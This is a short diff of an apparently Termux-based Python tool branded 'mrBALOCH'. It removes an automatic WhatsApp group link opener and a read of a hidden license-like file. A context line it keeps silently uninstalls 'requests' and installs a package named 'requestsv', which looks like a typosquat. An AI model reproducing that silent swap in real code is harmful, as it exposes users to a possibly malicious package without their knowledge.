@@ -8,7 +8,7 @@ try:
 except ModuleNotFoundError:
 	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
 	#os.system("python dilute")
-	os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
+
 try:
 	import bs4
 	from bs4 import BeautifulSoup as pars
@@ -984,7 +984,7 @@ def shoha_menu():
         os.system("clear")
         os.system("xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf")
         time.sleep(3.0)
-        id = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
+        
         os.system("clear")
         logo()
         print( '''    ╭──────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m DETAILS \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m  ──────────╮
